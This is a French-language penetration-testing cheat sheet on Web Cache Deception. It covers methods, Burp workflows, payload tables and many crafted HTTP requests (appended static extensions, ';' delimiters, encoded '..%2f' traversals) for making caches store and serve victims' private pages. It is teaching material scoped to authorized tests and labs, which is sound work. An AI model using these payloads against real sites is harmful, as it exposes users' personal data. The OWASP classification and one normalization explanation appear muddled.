# Web Cache Deception (WCD) — Cheat Sheet

## 1. Périmètre et conventions

Cette fiche couvre la détection et la démonstration d'impact de la **Web Cache Deception**, classée OWASP A02:2021 (Cryptographic Failures) / violation de confidentialité. Ne pas confondre avec la **Web Cache Poisoning** (faire stocker du contenu *malveillant* pour le distribuer à d'autres — mécanisme et objectif distincts).

**Mécanisme central :** le cache et le serveur d'origine interprètent différemment une même URL — le cache y voit une ressource statique cacheable, le serveur d'origine y répond avec du contenu dynamique et personnel. La réponse de la victime se retrouve stockée sous une clé de cache générique (sans identité utilisateur) que l'attaquant peut interroger librement.

**Trois mécanismes distincts produisent le désaccord d'interprétation :**

- **Path mapping discrepancy** : le routeur du serveur d'origine (REST) ignore un segment supplémentaire en fin d'URL que le cache prend en compte.
- **Delimiter discrepancy** : un caractère (`;`, `.`, `%00`) marque la fin du chemin significatif pour le serveur d'origine, mais pas pour le cache — ce qui dépend strictement du framework utilisé.
- **Normalization discrepancy** : le décodage des caractères encodés (`%2f`) et la résolution des traversals (`..`) sont effectués par l'un des composants et pas par l'autre.

**Outils :** Burp Suite (Repeater, Intruder), navigateur avec deux sessions distinctes, Burp Comparer.

**Conditions générales :** tests sur des environnements autorisés ou des labs dédiés uniquement.

**Conventions des exemples :**

| Placeholder | Signification |
|---|---|
| `cible.com` | Nom d'hôte fictif, à remplacer par la cible réelle autorisée |
| `/endpoint` | Chemin d'un endpoint dynamique retournant des données sensibles |
| `<session_victime>` | Cookie de session de la victime — dans les labs, compte distinct du compte attaquant |
| `<buster>` | Valeur aléatoire unique ajoutée à chaque test pour éviter la réutilisation d'une réponse précédemment cached |

> **Principe fondamental :** toujours utiliser un *cache buster* (paramètre de requête ou segment unique) lors de la phase de découverte pour éviter qu'un test fausse les résultats des suivants. Retirer le buster uniquement lors de la phase d'exploitation contrôlée.

---

## 2. Tableau de repérage rapide

| Objectif | Technique ou syntaxe | Quand l'utiliser | Signal attendu | Limite principale |
|---|---|---|---|---|
| Identifier une règle de cache par extension | Ajouter `/wcd.<ext>` à un endpoint dynamique + observer `X-Cache` | Tout endpoint dynamique, en début de test | `X-Cache: hit` ou délai réduit sur la 2e requête avec le même chemin | Le cache hit ne prouve pas que le contenu stocké est sensible |
| Identifier une différence de path mapping | Ajouter un segment arbitraire (`/aaa`) à la fin d'une URL dynamique | Serveur d'origine suspecté de routing REST | Même contenu que l'URL originale → serveur ignore le segment | Peut aussi être une redirection ou une réécriture non liée au mapping REST |
| Identifier un délimiteur côté serveur d'origine | Ajouter `;aaa.js` à la fin d'une URL dynamique (frameworks Spring, etc.) | Framework Java/Spring suspecté | Même contenu que l'URL originale → `;` est traité comme délimiteur | Comportement propre à chaque framework — ne pas généraliser |
| Confirmer mise en cache d'une réponse dynamique | Observer `X-Cache: hit` sur une URL piégée contenant une réponse dynamique | Après identification d'une règle de cache exploitable | `X-Cache: hit` ET contenu de la réponse dynamique dans le cache | Hit ne signifie pas que le contenu est sensible — lire le contenu stocké |
| Démontrer l'impact (exfiltration inter-session) | Relire l'URL piégée avec une session attaquant (ou sans session) | Après cache hit confirmé sur une réponse dynamique sensible | Données de la victime retournées à la session attaquant sans authentification | La clé de cache peut inclure un cookie ou paramètre de session — auquel cas l'accès inter-session est bloqué |
| Bypass règle de répertoire via normalisation | `/static/..%2f<endpoint>` ou `/static/..%2f<endpoint>;wcd.js` | Règle de cache basée sur un préfixe de répertoire (`/static`) | Cache applique la règle `/static`, serveur résout en endpoint dynamique | Dépend de quel composant normalise `%2f` — à tester empiriquement |
| Bypass règle de fichier via normalisation | `/<endpoint>/..%2frobots.txt` | Règle de cache basée sur un nom de fichier (`robots.txt`, `favicon.ico`) | Cache applique la règle sur le nom de fichier reconnu, serveur résout en endpoint | Seul le cas cache-normalise/serveur-ne-normalise-pas est exploitable ici |

---

## 3. Techniques classées par objectif

### 3.1 Détecter — Identifier les règles de cache en place

**Objectif :** comprendre sur quelle caractéristique de l'URL le cache fonde ses règles de mise en cache (extension, préfixe de répertoire, nom de fichier précis).

**Quand l'utiliser :** en début de test, avant de construire toute URL piégée.

**Prérequis :** accès à un endpoint dynamique connu retournant un contenu variable selon la session.

**Méthode — tester les extensions cacheables courantes (une par une, avec cache buster) :**

```http
GET /endpoint/wcd.css?buster=<buster_unique> HTTP/1.1
Host: cible.com
Cookie: session=<session>
```

```http
# Envoyer deux fois la même requête (sans modifier le buster) et comparer X-Cache
GET /endpoint/wcd.css?buster=<buster_unique> HTTP/1.1
Host: cible.com
```

**Extensions à tester (une par variante, pas toutes en même temps) :**

```text
.css    .js    .ico    .png    .jpg    .gif    .svg    .woff    .ttf
```

**Signal attendu :** `X-Cache: hit` sur la 2e requête **sans** que le contenu soit une ressource statique réelle — ou délai nettement inférieur sur la 2e requête si `X-Cache` n'est pas exposé.

**Interprétation :** un cache hit sur une URL avec extension ajoutée confirme que le cache applique une règle basée sur l'extension. Il ne confirme pas encore que le contenu stocké est dynamique ni sensible — étapes suivantes nécessaires.

**Limites :** certains CDN n'exposent pas `X-Cache`. L'absence de cet en-tête ne prouve pas l'absence de cache.

**Source :** cours fourni, section 7.1.

---

### 3.2 Détecter — Identifier le mécanisme de désaccord (path mapping)

**Objectif :** établir que le serveur d'origine ignore les segments supplémentaires en fin d'URL (routing REST tolérant).

**Quand l'utiliser :** règle de cache basée sur l'extension identifiée, avant de construire l'URL piégée.

**Méthode :**

```http
# Référence — contenu dynamique attendu
GET /endpoint HTTP/1.1
Host: cible.com
Cookie: session=<session>
```

```http
# Test — segment supplémentaire ajouté
GET /endpoint/wcd.css?buster=<buster_unique> HTTP/1.1
Host: cible.com
Cookie: session=<session>
```

**Signal attendu :** réponse identique entre les deux requêtes (même contenu dynamique, même statut HTTP) → le serveur d'origine ignore le segment `/wcd.css`.

**Interprétation :** si le serveur d'origine renvoie une réponse différente (404, 400, redirect) sur `/endpoint/wcd.css`, le mécanisme de path mapping n'est pas exploitable ici — passer au test de délimiteur.

**Source :** cours fourni, section 7.1.

---

### 3.3 Détecter — Identifier le mécanisme de désaccord (délimiteur)

**Objectif :** établir qu'un caractère spécial marque la fin du chemin significatif pour le serveur d'origine (mais pas pour le cache), permettant d'ajouter une extension statique après lui.

**Quand l'utiliser :** le serveur d'origine renvoie une erreur sur les segments supplémentaires ; framework connu utilisant des délimiteurs non standard.

**Délimiteurs à tester (un par un, avec cache buster) :**

| Caractère | Forme URL | Framework / contexte connu |
|---|---|---|
| `;` | `/endpoint;wcd.css` | Spring (Java) — matrix variables |
| `.` | `/endpoint.css` | Ruby on Rails — format de réponse |
| `%00` | `/endpoint%00.css` | Certaines configurations serveur acceptant un octet nul |

```http
GET /endpoint;wcd.css?buster=<buster_unique> HTTP/1.1
Host: cible.com
Cookie: session=<session>
```

**Signal attendu :** même contenu que `/endpoint` → le serveur tronque le chemin au délimiteur et traite la requête comme si elle visait `/endpoint`.

**Interprétation :** si le comportement varie d'un délimiteur à l'autre, noter lequel produit le même contenu — c'est le délimiteur exploitable pour ce serveur d'origine.

**Limites :** ces comportements sont strictement propres à chaque framework — un `;` fonctionnant sous Spring ne fonctionne pas nécessairement sur une autre stack.

**Source :** cours fourni, section 7.1.

---

### 3.4 Confirmer — Cache hit sur une réponse dynamique

**Objectif :** démontrer que le cache a effectivement stocké la réponse dynamique générée par le serveur d'origine, et non un contenu statique légitime.

**Quand l'utiliser :** mécanisme de désaccord identifié (path mapping ou délimiteur).

**Procédure :**

```text
Étape 1 — Envoyer l'URL piégée avec la session authentifiée (simulation de la victime)
  → Observer : réponse contient du contenu dynamique (données utilisateur) ?
               X-Cache : miss (première fois, normal)

Étape 2 — Envoyer exactement la même URL (même buster, sans session ou session attaquant)
  → Observer : X-Cache : hit ?
               Le contenu est-il identique à l'étape 1 (données de la victime) ?
```

```http
# Étape 1 — Session victime
GET /endpoint/wcd.css?buster=abc123 HTTP/1.1
Host: cible.com
Cookie: session=<session_victime>

# Étape 2 — Session attaquant ou sans session
GET /endpoint/wcd.css?buster=abc123 HTTP/1.1
Host: cible.com
```

**Signal attendu :** `X-Cache: hit` à l'étape 2 ET données de la victime dans le corps de la réponse.

**Interprétation :** la présence des données de la victime dans la réponse de l'attaquant (étape 2) est la preuve d'impact réelle, pas seulement le cache hit.

**Ce que cela ne prouve pas seul :** si la clé de cache inclut le cookie de session, l'étape 2 renverra une réponse différente ou un miss — la clé de cache doit être indépendante de l'identité.

**Source :** cours fourni, sections 6 et 9.

---

### 3.5 Exploiter — Règle de répertoire statique via normalisation

**Objectif :** satisfaire une règle de cache basée sur un préfixe de répertoire (`/static`, `/assets`) en utilisant une séquence de traversal encodée, tout en ciblant réellement un endpoint dynamique.

**Deux sous-cas selon quel composant normalise :**

#### Sous-cas A : le serveur d'origine normalise, le cache ne normalise pas

```text
URL piégée : /static/..%2f<endpoint>
```

```http
GET /static/..%2fprofile?buster=<buster_unique> HTTP/1.1
Host: cible.com
Cookie: session=<session_victime>
```

```text
Cache perçoit : /static/..%2fprofile → commence par /static → règle de répertoire appliquée
Serveur d'origine : /static/..%2fprofile → normalise %2f en / → résout en /profile → endpoint dynamique
```

#### Sous-cas B : le cache normalise, le serveur d'origine ne normalise pas

```text
URL piégée : /static/..%2f<endpoint>;wcd.css
(le délimiteur ; empêche le serveur de tenter de résoudre le traversal littéralement)
```

```http
GET /static/..%2fprofile;wcd.css?buster=<buster_unique> HTTP/1.1
Host: cible.com
Cookie: session=<session_victime>
```

```text
Cache normalise : /static/..%2fprofile → résout en /profile → mais... perçoit d'abord /static → règle appliquée
Serveur d'origine : tronque au ; → traite comme /static/..%2fprofile → renvoie /profile si framework le résout, ou erreur
```

**Signal attendu :** même qu'en section 3.4 — cache hit sur réponse dynamique, données de la victime accessibles.

**Limites :** le sous-cas exploitable dépend entièrement du comportement de normalisation de chaque composant, à vérifier empiriquement sur la cible.

**Source :** cours fourni, section 7.2.

---

### 3.6 Exploiter — Règle de nom de fichier via normalisation

**Objectif :** satisfaire une règle de cache ciblant un nom de fichier précis (`robots.txt`, `favicon.ico`) via un traversal encodé.

**Condition d'exploitabilité :** uniquement si le cache normalise les segments encodés mais pas le serveur d'origine (sous-cas symétrique au 3.5-B).

```http
GET /profile/..%2frobots.txt?buster=<buster_unique> HTTP/1.1
Host: cible.com
Cookie: session=<session_victime>
```

```text
Cache normalise : /profile/..%2frobots.txt → résout en /robots.txt → règle de nom de fichier appliquée
Serveur d'origine : ne normalise pas → interprète /profile/..%2frobots.txt → tronque au routeur → renvoie /profile
```

**Signal attendu :** même protocole qu'en 3.4.

**Limites :** fenêtre d'exploitabilité plus restreinte que les variantes par extension ou répertoire — le nom de fichier cible doit être précisément celui connu du cache.

**Source :** cours fourni, section 7.3.

---

## 4. Payloads et syntaxes représentatifs

| Intention | URL piégée de référence | Règle de cache exploitée | Mécanisme de désaccord | Variante utile |
|---|---|---|---|---|
| Règle d'extension, path mapping | `/endpoint/wcd.css` | Extension `.css` | Segment ignoré par le routeur REST | Tester `.js`, `.ico`, `.png` séparément |
| Règle d'extension, délimiteur `;` | `/endpoint;wcd.js` | Extension `.js` après `;` | `;` tronque le chemin côté serveur (Spring) | Tester `.css`, `.ico` avec le même délimiteur |
| Règle d'extension, délimiteur `.` | `/endpoint.css` | Extension `.css` directement | `.` interprété comme format par certains frameworks | Tester `.js`, `.json` |
| Règle de répertoire, normalisation serveur | `/static/..%2f<endpoint>` | Préfixe `/static` | Serveur normalise `%2f` → résout en endpoint | Adapter le préfixe au répertoire statique réel (`/assets`, `/public`) |
| Règle de répertoire, normalisation cache | `/static/..%2f<endpoint>;wcd.css` | Préfixe `/static` + extension | Cache normalise ET applique règle d'extension | Nécessite confirmation empirique du sous-cas |
| Règle de nom de fichier | `/<endpoint>/..%2frobots.txt` | Nom de fichier `robots.txt` | Cache normalise, serveur ne normalise pas | Tester `favicon.ico`, `sitemap.xml` |

**Aucune variante n'est universelle** — chaque payload dépend de la règle de cache en place et du comportement du serveur d'origine. Identifier les deux avant de construire l'URL piégée (sections 3.1 à 3.3).

---

## 5. Encodages, formats et représentation des entrées

| Représentation d'origine | Encodée | Contexte pertinent | Composant décodant | Effet attendu |
|---|---|---|---|---|
| `/` | `%2f` | Segment de traversal dans une URL piégée | Serveur d'origine OU cache (selon sous-cas) | Permet d'insérer un séparateur de chemin interprété seulement par le composant qui normalise |
| `..` (traversal) | `..` (non encodé) | Combiné avec `%2f` dans la règle de répertoire | Composant normalisant (`../`) | Remonte d'un niveau dans l'arborescence pour atteindre un endpoint dynamique hors du préfixe statique |
| `;` | `%3b` (optionnel) | Délimiteur de matrix variable | Serveur d'origine (Spring) | Tronque le chemin au délimiteur ; à tester encodé si le délimiteur brut est rejeté par un composant intermédiaire |
| `.` | `.` (brut) | Délimiteur de format de réponse | Serveur d'origine (Rails) | Le point est traité comme séparateur de format, pas comme partie du chemin |
| `%00` | `%00` | Octet nul comme délimiteur | Certains serveurs C/C++ | Tronque la chaîne au niveau de l'octet nul — à tester uniquement si les délimiteurs texte échouent tous |

**Condition d'inefficacité :** si les deux composants (cache et serveur d'origine) appliquent la même normalisation, la divergence d'interprétation disparaît et l'exploitation est impossible par ce vecteur. Confirmer toujours empiriquement quel composant normalise sur la cible réelle.

---

## 6. Exemples de requêtes HTTP

### 6.1 Test de règle d'extension avec cache buster

```http
# Étape 1 — Référence (URL légitime, vérifier que le contenu est dynamique et sensible)
GET /settings/users/list HTTP/1.1
Host: cible.com
Cookie: session=<session_victime>

# → Réponse attendue : 200 OK, contenu dynamique (liste d'utilisateurs, données propres à la session)
# → X-Cache : miss (premier accès)
```

```http
# Étape 2 — URL piégée (avec cache buster, même session)
GET /settings/users/list/wcd.js?buster=test001 HTTP/1.1
Host: cible.com
Cookie: session=<session_victime>

# → Signal attendu : même contenu dynamique que l'étape 1
# → X-Cache : miss (première fois — normal)
```

```http
# Étape 3 — Relecture sans session (simulation attaquant)
GET /settings/users/list/wcd.js?buster=test001 HTTP/1.1
Host: cible.com

# → Signal d'impact : X-Cache: hit + contenu de la victime dans la réponse
```

- **Changement clé entre étapes 1 et 2 :** segment `/wcd.js` ajouté.
- **Ce que prouve l'étape 3 :** l'impact réel — données de la victime accessibles sans authentification.
- **Ce que l'étape 2 seule ne prouve pas :** que le contenu est accessible à un tiers.

### 6.2 Test de délimiteur `;` (Spring)

```http
# URL légitime — référence
GET /settings/users/list HTTP/1.1
Host: cible.com
Cookie: session=<session_victime>
```

```http
# URL piégée avec délimiteur point-virgule
GET /settings/users/list;wcd.js?buster=test002 HTTP/1.1
Host: cible.com
Cookie: session=<session_victime>
```

- **Changement clé :** `;wcd.js` ajouté directement après le chemin sans `/` supplémentaire.
- **À distinguer de la variante path mapping :** ici pas de `/` avant le segment ajouté — le `;` joue le rôle de délimiteur, pas un segment de chemin supplémentaire.

### 6.3 Bypass de règle de répertoire (serveur normalise)

```http
# URL piégée pour règle /static — le serveur normalise %2f
GET /static/..%2fsettings/users/list?buster=test003 HTTP/1.1
Host: cible.com
Cookie: session=<session_victime>

# Cache voit : commence par /static → règle appliquée
# Serveur : décode %2f en / → résout ../settings/users/list → → /settings/users/list → endpoint dynamique
```

- **Prérequis :** vérifier que `/settings/users/list` renvoie bien du contenu dynamique sur l'étape de référence.
- **Ce que cela ne prouve pas seul :** quel composant normalise — tester aussi `/static/..%2fsettings/users/list;static.css` pour le sous-cas inverse.

---

## 7. Outils et commandes

| Outil | Fonction | Quand l'utiliser | Configuration minimale | Limite ou précaution |
|---|---|---|---|---|
| Burp Repeater | Envoi manuel de requêtes, observation des en-têtes `X-Cache` et du contenu | Toutes les phases de test (détection, confirmation, impact) | Observer `X-Cache`, `Cache-Control`, `Content-Type` et le contenu entre chaque étape | Changer le cache buster entre chaque séquence de test indépendante |
| Burp Comparer | Comparaison côte à côte de deux réponses | Confirmer que `/endpoint/wcd.css` renvoie le même contenu que `/endpoint` | Comparer les corps de réponse entre URL légitime et URL piégée | Ne compare pas les timings — utiliser les métadonnées Burp pour les délais |
| Burp Intruder (Sniper) | Itération sur la liste d'extensions ou de délimiteurs | Identifier rapidement quelle extension déclenche un cache hit | Positionner sur l'extension dans l'URL, charger la liste `.css .js .ico …` | Changer le buster pour chaque requête de la liste pour éviter les collisions de clé |
| Deux comptes distincts (navigateur ou Burp sessions) | Simuler victime et attaquant en parallèle | Phase de démonstration d'impact | Session A = victime (authentifiée), session B = attaquant (non authentifié ou autre compte) | Ne jamais utiliser la même session pour les deux rôles |

---

## 8. Signaux caractéristiques et vérifications

| Observation | Ce qu'elle peut indiquer | Vérification complémentaire | Conclusion à éviter |
|---|---|---|---|
| `X-Cache: hit` sur une URL piégée contenant une extension statique | Le cache a appliqué une règle de mise en cache sur cette URL | Lire le contenu de la réponse — est-il dynamique et sensible, ou statique/générique ? | Que le hit seul prouve une vulnérabilité — le contenu stocké peut être sans sensibilité |
| Réponse identique entre `/endpoint` et `/endpoint/wcd.css` | Le serveur d'origine ignore le segment supplémentaire | Confirmer que le contenu est dynamique (varie selon la session) avant de conclure à un path mapping exploitable | Qu'une réponse identique implique nécessairement un routing REST — peut être une redirection ou une réécriture |
| Délai nettement inférieur sur la 2e requête vers l'URL piégée | Possible cache hit (contenu servi depuis le cache) | Confirmer avec `X-Cache` si disponible ; répéter plusieurs fois pour écarter des variations de charge réseau | Qu'un délai inférieur unique constitue une preuve de cache hit — trop de facteurs externes peuvent expliquer la variation |
| Données de la session victime retournées sans authentification | Impact confirmé — données d'un utilisateur accessibles à un tiers via le cache | Reproduire avec une session attaquant distincte (pas la même session ni le même navigateur) | Qu'un seul test reproductible sur la même session démontre un accès inter-session — toujours vérifier avec deux sessions réellement distinctes |
| `Cache-Control: no-store` dans les en-têtes de réponse de l'origine | L'application marque la réponse comme non cacheable | Vérifier que l'infrastructure de cache respecte effectivement cet en-tête (certains CDN peuvent l'outrepasser selon leur configuration) | Que la présence de `no-store` garantit l'absence de mise en cache — la configuration CDN peut prendre le dessus |

---

## 9. Variantes de syntaxe et adaptation

#### Adapter l'extension selon la règle de cache identifiée

**Problème précis :** l'extension `.css` ne produit pas de cache hit.

**Ce qui change :** uniquement l'extension dans l'URL piégée — le mécanisme de désaccord, le chemin cible et le cache buster restent identiques.

**Ordre de test recommandé** (une extension à la fois, avec buster distinct à chaque essai) :

```text
.css → .js → .ico → .png → .jpg → .gif → .woff → .ttf → .svg
```

#### Adapter le délimiteur selon le framework du serveur d'origine

**Problème précis :** `;wcd.css` ne produit pas le même contenu que l'URL originale.

**Ce qui change :** uniquement le délimiteur — le reste de l'URL piégée reste identique.

| Framework suspecté | Délimiteur à tester |
|---|---|
| Spring (Java) | `;` |
| Ruby on Rails | `.` (format de réponse) |
| Autre / inconnu | `%00`, `\`, `?` (dans certaines configs) |

**Règle :** ne changer qu'un délimiteur à la fois. Changer simultanément le délimiteur et l'extension rend le résultat ininterprétable.

#### Adapter le préfixe de répertoire selon l'application

**Problème précis :** `/static/..%2fendpoint` renvoie une erreur au lieu du contenu dynamique.

**Causes possibles :** préfixe incorrectement choisi, ou sous-cas de normalisation inverse (c'est le cache qui normalise, pas le serveur).

**Ce qui change :**

```text
1. Essayer d'autres préfixes (/assets, /public, /media, /dist, /cdn)
2. Si toujours en erreur → tester le sous-cas inverse :
   /static/..%2f<endpoint>;wcd.css
   (ajout d'un délimiteur pour empêcher le serveur de tenter de résoudre le traversal lui-même)
```

---

## 10. Diagnostic rapide des erreurs

| Problème constaté | Causes possibles | Vérification à effectuer | Ajustement pertinent | Ce que cela permet de conclure |
|---|---|---|---|---|
| Pas de `X-Cache` dans les en-têtes de réponse | CDN ne l'expose pas, ou pas de cache en place sur ce chemin | Comparer les délais de réponse entre 1re et 2e requête ; chercher d'autres en-têtes de cache (`Age`, `CF-Cache-Status`, `X-Varnish`) | Utiliser les délais de réponse comme signal secondaire | Que l'absence de `X-Cache` ne prouve pas l'absence de cache — d'autres en-têtes peuvent le révéler |
| URL piégée → réponse différente de l'URL originale (404, redirect) | Le serveur d'origine ne tolère pas le segment/délimiteur ajouté | Tester les autres mécanismes de désaccord (délimiteur si path mapping échoue, ou inversement) | Essayer `;`, `.`, `%00` comme délimiteurs alternatifs | Que ce mécanisme précis n'est pas exploitable ici — pas que l'endpoint est globalement protégé |
| Cache hit confirmé mais contenu non sensible (page générique, erreur) | La réponse mise en cache est celle d'une requête sans session (page publique) | Vérifier que la requête de l'étape 1 portait bien la session victime et a bien retourné du contenu dynamique | S'assurer que la session est valide avant l'étape 1 | Que le cache hit seul ne suffit pas — seul le hit sur une réponse dynamique avec données sensibles constitue un vrai signal |
| Étape 3 (attaquant) renvoie un miss au lieu d'un hit | La clé de cache inclut la session ou un paramètre lié à l'identité | Vérifier les en-têtes de la réponse de l'étape 1 — `Vary: Cookie` ou similaire ? | Si `Vary: Cookie` présent : la clé de cache inclut le cookie → accès inter-session bloqué par le cache | Que l'absence de hit inter-session ne signifie pas que la mise en cache n'a pas eu lieu, mais que la clé inclut l'identité — la vulnérabilité est alors non exploitable dans ce scénario |
| Normalisation de traversal sans effet (erreur ou contenu incorrect) | Sous-cas de normalisation inverse non identifié | Tester le sous-cas opposé (avec délimiteur supplémentaire) ; vérifier quel composant normalise par des tests unitaires sur des URLs de référence | Adapter le payload au sous-cas réel de la cible | Que l'un des deux sous-cas peut être exploitable même si l'autre ne l'est pas |
| Résultats non reproductibles (hit parfois, miss parfois) | TTL du cache expiré entre deux tests, ou charge du CDN variable | Travailler avec un buster fixe par séquence de test ; effectuer les tests rapidement après la mise en cache | Augmenter le TTL de test ou répéter la séquence entière à la suite | Que l'instabilité peut refléter un TTL court — pas que la vulnérabilité est intermittente |

---

## 11. Checklist d'utilisation

- [ ] La règle de cache exploitée (extension, répertoire, nom de fichier) est identifiée avant de construire l'URL piégée.
- [ ] Le mécanisme de désaccord (path mapping, délimiteur, normalisation) est confirmé empiriquement pour la cible.
- [ ] Un cache buster distinct est utilisé pour chaque séquence de test indépendante.
- [ ] L'URL piégée retourne bien le même contenu dynamique que l'URL légitime (étape 1 vs référence comparées via Burp Comparer).
- [ ] Le cache hit est confirmé sur l'URL piégée avec session victime (`X-Cache: hit` ou délai réduit).
- [ ] L'impact réel est démontré avec deux sessions distinctes (victime et attaquant), pas avec la même session.
- [ ] Le contenu retourné à la session attaquant est explicitement vérifié (données de la victime présentes).
- [ ] L'absence de `X-Cache` n'est pas conclue comme absence de cache sans vérification des délais et des en-têtes alternatifs.
- [ ] Un seul élément est modifié à la fois (extension, délimiteur, ou préfixe) entre deux tests comparatifs.
- [ ] Le résultat est reproduit au moins une fois avant d'être documenté comme finding.

---

## 12. Sources et liens de référence

- [PortSwigger Web Security Academy — Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- OWASP — A02:2021 Cryptographic Failures (violation de confidentialité via accès non autorisé à des données protégées)
- Documentation du CDN ou système de cache utilisé par la cible (vérifier les options de configuration spécifiques, ex. Cloudflare Cache Deception Armor)
- Voir aussi : fiche complémentaire sur la **Web Cache Poisoning** pour le vecteur symétrique (faire stocker du contenu malveillant destiné à d'autres utilisateurs — mécanismes et objectifs distincts).
